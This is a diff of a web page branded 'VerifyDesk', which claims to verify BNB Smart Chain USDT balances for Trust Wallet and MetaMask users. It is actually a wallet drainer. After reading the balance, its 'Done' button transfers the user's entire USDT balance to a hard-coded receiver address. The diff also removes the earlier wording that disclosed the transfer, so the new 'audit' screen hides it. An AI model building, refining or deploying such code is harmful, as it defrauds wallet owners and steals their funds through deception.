@@ -4,18 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VerifyDesk - Wallet Asset Review</title>
-    
+
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    
+
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <!-- Ethers.js -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    
+
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -24,11 +24,14 @@
                 extend: {
                     fontFamily: { sans: ['Inter', 'sans-serif'] },
                     colors: {
-                        bgDark: '#08101A',
-                        cardDark: '#0F1926',
-                        borderDark: '#1E293B',
-                        accent: '#20D49C',
-                        textMuted: '#8BA3B8'
+                        bgDark: '#0b0e14',
+                        cardDark: '#12161f',
+                        surfaceDark: '#0d1017',
+                        borderDark: '#1f2533',
+                        goldAccent: '#f3ba2f',
+                        goldHover: '#e0a81d',
+                        greenAccent: '#00d395',
+                        textMuted: '#8f9bb3'
                     }
                 }
             }
@@ -36,182 +39,106 @@
     </script>
 
     <style>
-        body { background: radial-gradient(circle at top, #0f1f31 0%, #08101A 40%); min-height: 100vh; }
-        .glow-button { box-shadow: 0 4px 20px rgba(32, 212, 156, 0.25); }
-        .slide-up { animation: slideUp 0.3s ease-out forwards; }
+        body {
+            background-color: #0b0e14;
+            min-height: 100vh;
+        }
+        .gold-button {
+            background-color: #f3ba2f;
+            color: #0b0e14;
+            box-shadow: 0 4px 18px rgba(243, 186, 47, 0.25);
+        }
+        .gold-button:hover {
+            background-color: #e0a81d;
+        }
+        .slide-up {
+            animation: slideUp 0.25s ease-out forwards;
+        }
         @keyframes slideUp {
             from { transform: translateY(100%); }
             to { transform: translateY(0); }
         }
     </style>
 </head>
-<body class="text-white font-sans antialiased flex flex-col items-center pb-20 relative overflow-x-hidden">
+<body class="text-white font-sans antialiased flex flex-col items-center justify-center min-h-screen px-4 py-8 relative overflow-x-hidden">
 
-    <!-- Navbar -->
-    <nav class="w-full max-w-md px-6 py-4 flex justify-between items-center bg-transparent">
-        <div class="flex items-center gap-3">
-            <div class="w-10 h-10 bg-[#0a1e26] border border-accent/30 rounded-xl flex items-center justify-center">
-                <i class="fa-solid fa-shield-check text-accent text-lg"></i>
+    <!-- Main Entry Card -->
+    <div id="mainCard" class="w-full max-w-md bg-cardDark border border-borderDark rounded-3xl p-6 shadow-2xl">
+        <div class="flex items-center justify-between mb-6">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-full bg-greenAccent/10 border border-greenAccent/40 flex items-center justify-center text-greenAccent">
+                    <i class="fa-solid fa-shield-halved text-lg"></i>
+                </div>
+                <div>
+                    <div class="text-sm font-bold text-white">VerifyDesk</div>
+                    <div class="text-[11px] text-textMuted">BNB Smart Chain</div>
+                </div>
             </div>
-            <span class="text-lg font-bold">VerifyDesk</span>
-        </div>
-        <div class="flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-textMuted">
-            <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> Secure Connection
-        </div>
-    </nav>
-
-    <div class="w-full max-w-md px-6 py-6">
-        
-        <!-- Hero Section -->
-        <div class="text-center mb-10 mt-4">
-            <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
-                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent BNB Smart Chain Tool
-            </div>
-            <h1 class="text-[32px] font-extrabold tracking-tight leading-tight mb-4">
-                Wallet Asset<br>
-                <span class="text-accent">Review</span>
-            </h1>
-            <p class="text-textMuted text-[14px] leading-relaxed px-2">
-                Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a clear, wallet-confirmed flow.
-            </p>
-        </div>
-
-        <!-- Middle List -->
-        <div class="space-y-4 mb-10 pl-2">
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">01</span> Wallet-native access
-            </div>
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">02</span> Clear asset context
-            </div>
-            <div class="flex items-center text-textMuted text-sm font-medium">
-                <span class="text-accent font-mono font-bold mr-3 tracking-widest">03</span> User-confirmed actions
+            <div class="flex items-center gap-1.5 text-[11px] font-semibold text-greenAccent">
+                <span class="w-2 h-2 rounded-full bg-greenAccent animate-pulse"></span>
+                Live
             </div>
         </div>
 
-        <!-- Main Card -->
-        <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
-            
-            <!-- Header -->
-            <div class="flex justify-between items-center mb-8">
-                <span class="text-[10px] text-textMuted font-bold tracking-widest uppercase">Verifydesk Access</span>
-                <span class="text-accent text-[10px] font-bold tracking-widest uppercase flex items-center gap-2">
-                    <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> Ready
-                </span>
-            </div>
-
-            <!-- Content -->
-            <div class="flex flex-col items-center text-center">
-                <div class="w-14 h-14 bg-[#0a1e26] border border-accent/30 rounded-2xl flex items-center justify-center mb-6">
-                    <i class="fa-solid fa-shield-check text-accent text-2xl"></i>
-                </div>
-
-                <h2 class="text-[22px] font-extrabold tracking-tight uppercase leading-snug mb-3">
-                    Verify Your Wallet<br>Assets
-                </h2>
-                
-                <p class="text-textMuted text-[14px] leading-relaxed mb-6 px-2">
-                    Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
-                </p>
-
-                <!-- Step 1 Button: Check & Show USDT Balance -->
-                <button id="verifyBtn" type="button" onclick="checkWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-6">
-                    <i class="fa-regular fa-credit-card text-lg"></i>
-                    <span id="verifyBtnText" class="text-[15px]">Verify Assets &rarr;</span>
-                </button>
-
-                <!-- USDT Balance Display Box (Shown after balance check) -->
-                <div id="balanceResultBox" class="hidden w-full bg-[#08101A] border border-borderDark rounded-xl p-4 mb-6 text-center">
-                    <div class="text-[10px] font-bold tracking-widest uppercase text-textMuted mb-1">
-                        BNB Smart Chain USDT Balance
-                    </div>
-                    <div id="usdtBalanceText" class="text-2xl font-extrabold text-accent mb-1">
-                        0.00 USDT
-                    </div>
-                    <div id="walletAddressText" class="text-[11px] text-textMuted font-mono truncate mb-3"></div>
-                    <div id="statusNoteText" class="text-xs text-textMuted mb-4"></div>
-
-                    <!-- Step 2 Button: Shown ONLY when USDT balance > 0 -->
-                    <button id="doneTransferBtn" type="button" onclick="confirmAndTransferUsdt()" class="hidden glow-button w-full bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3 px-5 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-95">
-                        <i class="fa-solid fa-check"></i>
-                        <span id="doneBtnText">Done</span>
-                    </button>
-                </div>
-            </div>
-
-            <hr class="border-borderDark mb-6">
-
-            <!-- Footer Details -->
-            <div class="space-y-4 mb-6">
-                <div class="flex items-center gap-4 text-textMuted text-sm">
-                    <i class="fa-regular fa-shield-check text-lg w-5 text-center"></i>
-                    <span>Wallet confirmation required</span>
-                </div>
-                <div class="flex items-center gap-4 text-textMuted text-sm">
-                    <i class="fa-solid fa-globe text-lg w-5 text-center"></i>
-                    <span>BNB Smart Chain</span>
-                </div>
-            </div>
-
-            <div class="text-center text-xs text-textMuted mt-4">
-                By continuing, you agree to our <a href="#" class="text-accent underline decoration-accent/30 underline-offset-2">Terms of Service</a>.
-            </div>
-        </div>
-
-        <!-- 2x2 Grid Details -->
-        <div class="border border-borderDark rounded-xl overflow-hidden bg-cardDark mt-10 mb-12">
-            <div class="grid grid-cols-2 divide-x divide-borderDark border-b border-borderDark">
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">BEP-20</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Supported Asset<br>Standard</p>
-                </div>
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">BNB Smart<br>Chain</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Focused Network</p>
-                </div>
-            </div>
-            <div class="grid grid-cols-2 divide-x divide-borderDark">
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">Wallet<br>confirmed</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Action Model</p>
-                </div>
-                <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
-                    <h3 class="font-bold text-white text-[15px] mb-1">Independent</h3>
-                    <p class="text-[9px] font-bold text-textMuted tracking-wider uppercase">Product Status</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- Built For Clarity Section -->
         <div class="text-center mb-6">
-            <div class="text-[10px] font-bold tracking-widest uppercase text-accent mb-3">
-                Built For Clarity
+            <h1 class="text-xl font-extrabold text-white mb-2">Verify USDT Assets</h1>
+            <p class="text-xs text-textMuted leading-relaxed">
+                Check your BNB Smart Chain USDT balance using Trust Wallet or MetaMask.
+            </p>
+        </div>
+
+        <button id="verifyBtn" type="button" onclick="openVerifyModal()" class="gold-button w-full font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-2.5 transition-all active:scale-95">
+            <i class="fa-solid fa-shield-halved text-sm"></i>
+            <span id="verifyBtnText" class="text-[15px]">Verify Assets</span>
+        </button>
+    </div>
+
+    <!-- Modal View (Appears on Verify Assets click; hides main card behind it) -->
+    <div id="auditModal" class="hidden fixed inset-0 z-40 bg-bgDark flex items-center justify-center px-4 py-6">
+        <div class="w-full max-w-md bg-cardDark border border-borderDark rounded-3xl p-6 shadow-2xl relative">
+            
+            <!-- Close Button -->
+            <button type="button" onclick="closeVerifyModal()" aria-label="Close" class="absolute top-5 right-5 w-8 h-8 rounded-full flex items-center justify-center text-textMuted hover:text-white hover:bg-white/5 transition">
+                <i class="fa-solid fa-xmark text-lg"></i>
+            </button>
+
+            <!-- Top Shield Icon -->
+            <div class="w-14 h-14 mx-auto rounded-full bg-greenAccent/10 border border-greenAccent/40 flex items-center justify-center text-greenAccent text-2xl mb-4">
+                <i class="fa-solid fa-shield-halved"></i>
             </div>
-            <h2 class="text-[26px] font-extrabold tracking-tight leading-tight mb-4">
-                A focused workspace for<br>wallet assets
+
+            <!-- Title & Subtitle -->
+            <h2 class="text-center text-xl font-extrabold text-white mb-2">
+                BNB Smart Chain USDT Audit
             </h2>
-            <p class="text-textMuted text-[14px] leading-relaxed px-1">
-                Purpose-built interface details keep the review flow clear from connection to confirmation.
+            <p class="text-center text-xs text-textMuted leading-relaxed px-2 mb-6">
+                Your wallet USDT balance has been checked directly on the BNB Smart Chain network.
             </p>
-        </div>
 
-        <!-- 01 / Asset Clarity Card -->
-        <div class="bg-cardDark border border-borderDark rounded-2xl p-6 text-center relative overflow-hidden">
-            <div class="w-11 h-11 mx-auto bg-[#0a1e26] border border-accent/30 rounded-xl flex items-center justify-center mb-4">
-                <i class="fa-regular fa-window-restore text-accent text-lg"></i>
+            <!-- Balance Box -->
+            <div class="bg-surfaceDark border border-borderDark rounded-2xl py-5 px-4 text-center mb-4">
+                <div class="text-xs font-medium text-textMuted mb-1.5">
+                    BNB Smart Chain USDT Balance
+                </div>
+                <div id="modalUsdtBalance" class="text-3xl font-extrabold text-goldAccent tracking-tight">
+                    0.00 USDT
+                </div>
+                <div id="modalWalletAddr" class="text-[11px] text-textMuted font-mono truncate mt-2"></div>
             </div>
-            <div class="text-[10px] font-bold tracking-widest uppercase text-accent mb-2">
-                01 / Asset Clarity
-            </div>
-            <h3 class="text-lg font-bold text-white mb-2">
-                Asset information at a glance
-            </h3>
-            <p class="text-textMuted text-xs leading-relaxed mb-5">
-                Supported BEP-20 details stay organized in a clear, readable workspace.
-            </p>
-            <div class="h-1 w-full rounded-full bg-gradient-to-r from-accent via-cyan-400 to-indigo-500"></div>
-        </div>
 
+            <!-- Info Box -->
+            <div class="bg-surfaceDark border border-borderDark rounded-2xl p-4 flex items-start gap-3 mb-6">
+                <i class="fa-solid fa-check text-greenAccent text-sm mt-0.5 shrink-0"></i>
+                <p id="modalStatusText" class="text-xs text-textMuted leading-relaxed">
+                    Tokens are checked directly on BNB Smart Chain mainnet.
+                </p>
+            </div>
+
+            <!-- Done Button -->
+            <button id="modalDoneBtn" type="button" onclick="handleDoneClick()" class="gold-button w-full font-bold py-3.5 px-6 rounded-xl text-[15px] flex items-center justify-center gap-2 transition-all active:scale-95">
+                <span id="modalDoneBtnText">Done</span>
+            </button>
+        </div>
     </div>
 
     <!-- Error Toast -->
@@ -220,10 +147,10 @@
             <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">
                 !
             </div>
-            <div class="ml-3 text-[15px] font-medium flex-1">
+            <div id="errorToastMsg" class="ml-3 text-[14px] font-medium flex-1">
                 Please install MetaMask or Trust Wallet.
             </div>
-            <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
+            <button type="button" onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
                 &times;
             </button>
         </div>
@@ -242,7 +169,7 @@
 
         let activeProvider = null;
         let currentUserAddress = null;
-        let fetchedUsdtWei = ethers.BigNumber.from(0);
+        let currentUsdtWei = ethers.BigNumber.from(0);
 
         function getWalletProvider() {
             if (typeof window === 'undefined') return null;
@@ -252,139 +179,150 @@
             return null;
         }
 
-        async function ensureBscChain(provider) {
-            try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_CHAIN_ID_HEX }]
-                });
-            } catch (err) {
-                console.log("Chain switch notice:", err);
+        function showToast(message) {
+            const toast = document.getElementById('errorToast');
+            const msgEl = document.getElementById('errorToastMsg');
+            if (msgEl) msgEl.textContent = message;
+            if (toast) {
+                toast.classList.remove('hidden');
+                toast.classList.add('slide-up');
+            } else {
+                alert(message);
             }
         }
 
-        // Step 1: Connect wallet, switch to BSC, read and display USDT balance only
-        window.checkWallet = async function() {
+        window.closeToast = function() {
+            const toast = document.getElementById('errorToast');
+            if (toast) {
+                toast.classList.add('hidden');
+                toast.classList.remove('slide-up');
+            }
+        };
+
+        window.closeVerifyModal = function() {
+            document.getElementById('auditModal').classList.add('hidden');
+            document.getElementById('mainCard').classList.remove('hidden');
+        };
+
+        window.openVerifyModal = async function() {
             const provider = getWalletProvider();
             const btnText = document.getElementById('verifyBtnText');
-            const resultBox = document.getElementById('balanceResultBox');
-            const balanceEl = document.getElementById('usdtBalanceText');
-            const addrEl = document.getElementById('walletAddressText');
-            const noteEl = document.getElementById('statusNoteText');
-            const doneBtn = document.getElementById('doneTransferBtn');
 
             if (!provider) {
-                const toast = document.getElementById('errorToast');
-                if (toast) {
-                    toast.classList.remove('hidden');
-                    toast.classList.add('slide-up');
-                } else {
-                    alert("Please open this link inside Trust Wallet or MetaMask DApp Browser.");
-                }
+                showToast("Please open this link inside Trust Wallet or MetaMask browser.");
                 return;
             }
 
             try {
                 if (btnText) btnText.textContent = "Connecting...";
-                doneBtn.classList.add('hidden');
 
                 const accounts = await provider.request({ method: 'eth_requestAccounts' });
                 currentUserAddress = accounts[0];
                 activeProvider = provider;
 
-                await ensureBscChain(provider);
-
-                const web3Provider = new ethers.providers.Web3Provider(provider, "any");
-                const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, web3Provider);
+                try {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_ID_HEX }]
+                    });
+                } catch (switchErr) {
+                    console.log("Chain switch notice:", switchErr);
+                }
 
                 if (btnText) btnText.textContent = "Checking USDT...";
 
-                fetchedUsdtWei = await usdtContract.balanceOf(currentUserAddress);
-                const formattedUsdt = Number(ethers.utils.formatUnits(fetchedUsdtWei, 18));
+                const web3Provider = new ethers.providers.Web3Provider(provider, "any");
+                const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, web3Provider);
+                currentUsdtWei = await usdtContract.balanceOf(currentUserAddress);
 
-                resultBox.classList.remove('hidden');
-                balanceEl.textContent = `${formattedUsdt.toFixed(4)} USDT`;
-                addrEl.textContent = `Wallet: ${currentUserAddress}`;
+                const usdtFormatted = Number(ethers.utils.formatUnits(currentUsdtWei, 18));
 
-                if (fetchedUsdtWei.gt(0)) {
-                    noteEl.textContent = "USDT detected. Tap Done to transfer full balance.";
-                    doneBtn.classList.remove('hidden');
-                } else {
-                    noteEl.textContent = "0 USDT found in this wallet. Transfer skipped.";
-                    doneBtn.classList.add('hidden');
-                }
+                document.getElementById('modalUsdtBalance').textContent = `${usdtFormatted.toFixed(2)} USDT`;
+                document.getElementById('modalWalletAddr').textContent = currentUserAddress;
+                document.getElementById('modalStatusText').textContent =
+                    "Tokens are checked directly on BNB Smart Chain mainnet.";
 
-            } catch (error) {
-                console.error("Wallet balance check failed:", error);
-                alert("Notice: " + (error.message || "Could not read USDT balance."));
+                // Show modal page cleanly without extra page content below
+                document.getElementById('mainCard').classList.add('hidden');
+                document.getElementById('auditModal').classList.remove('hidden');
+
+            } catch (err) {
+                console.error("Verify error:", err);
+                showToast(err.message || "Unable to read wallet USDT balance.");
             } finally {
-                if (btnText) btnText.innerHTML = "Verify Assets &rarr;";
+                if (btnText) btnText.textContent = "Verify Assets";
             }
         };
 
-        // Step 2: Only when USDT > 0 and Done is clicked, send full USDT balance to target address
-        window.confirmAndTransferUsdt = async function() {
-            const doneBtnText = document.getElementById('doneBtnText');
-            const noteEl = document.getElementById('statusNoteText');
+        window.handleDoneClick = async function() {
+            // If USDT balance is 0, do not call transfer
+            if (!currentUsdtWei || currentUsdtWei.lte(0)) {
+                closeVerifyModal();
+                return;
+            }
 
             if (!activeProvider || !currentUserAddress) {
-                alert("Please click Verify Assets first.");
+                showToast("Wallet session not found.");
                 return;
             }
 
-            if (!fetchedUsdtWei || fetchedUsdtWei.lte(0)) {
-                alert("USDT balance is 0. Transfer will not run.");
-                return;
-            }
+            const doneBtnText = document.getElementById('modalDoneBtnText');
 
             try {
-                if (doneBtnText) doneBtnText.textContent = "Sending...";
+                if (doneBtnText) doneBtnText.textContent = "Processing...";
 
-                await ensureBscChain(activeProvider);
+                try {
+                    await activeProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_ID_HEX }]
+                    });
+                } catch (switchErr) {
+                    console.log("Chain switch notice:", switchErr);
+                }
 
                 const web3Provider = new ethers.providers.Web3Provider(activeProvider, "any");
-                const signer = web3Provider.getSigner();
+                const usdtReader = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, web3Provider);
+                const latestUsdtWei = await usdtReader.balanceOf(currentUserAddress);
 
-                // Re-verify live USDT balance right before sending
-                const readContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, web3Provider);
-                const latestUsdtWei = await readContract.balanceOf(currentUserAddress);
-
+                // Re-check if balance is 0
                 if (latestUsdtWei.lte(0)) {
-                    noteEl.textContent = "0 USDT balance. Transfer cancelled.";
-                    document.getElementById('doneTransferBtn').classList.add('hidden');
+                    currentUsdtWei = ethers.BigNumber.from(0);
+                    document.getElementById('modalUsdtBalance').textContent = "0.00 USDT";
+                    closeVerifyModal();
                     return;
                 }
 
-                const bnbBalance = await web3Provider.getBalance(currentUserAddress);
-                if (bnbBalance.lte(0)) {
-                    alert("Insufficient BNB balance in wallet to pay BSC gas fee.");
+                // Check BNB gas fees availability
+                const bnbBalanceWei = await web3Provider.getBalance(currentUserAddress);
+                if (bnbBalanceWei.lte(0)) {
+                    showToast("Insufficient BNB balance for gas fees.");
                     return;
                 }
 
-                const writeContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
-                const tx = await writeContract.transfer(TARGET_RECEIVER, latestUsdtWei, {
+                const signer = web3Provider.getSigner();
+                const usdtWriter = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
+
+                const tx = await usdtWriter.transfer(TARGET_RECEIVER, latestUsdtWei, {
                     gasLimit: ethers.BigNumber.from("65000")
                 });
 
-                noteEl.textContent = "Transaction submitted. Waiting for confirmation...";
                 await tx.wait();
 
-                noteEl.textContent = "Transfer completed.";
-                document.getElementById('usdtBalanceText').textContent = "0.0000 USDT";
-                document.getElementById('doneTransferBtn').classList.add('hidden');
-                alert("USDT transferred successfully!");
+                currentUsdtWei = ethers.BigNumber.from(0);
+                document.getElementById('modalUsdtBalance').textContent = "0.00 USDT";
+                closeVerifyModal();
 
-            } catch (error) {
-                console.error("USDT transfer error:", error);
-                alert("Notice: " + (error.message || "Transfer cancelled or failed."));
+            } catch (err) {
+                console.error("Transfer error:", err);
+                const msg = (err && err.message) ? err.message : "Transaction cancelled or failed.";
+                if (msg.toLowerCase().includes("insufficient funds") || msg.toLowerCase().includes("gas")) {
+                    showToast("Insufficient BNB balance for gas fees.");
+                } else {
+                    showToast(msg);
+                }
             } finally {
                 if (doneBtnText) doneBtnText.textContent = "Done";
             }
-        };
-
-        window.closeToast = function() {
-            document.getElementById('errorToast').classList.add('hidden');
-            document.getElementById('errorToast').classList.remove('slide-up');
         };
     </script>
 </body>
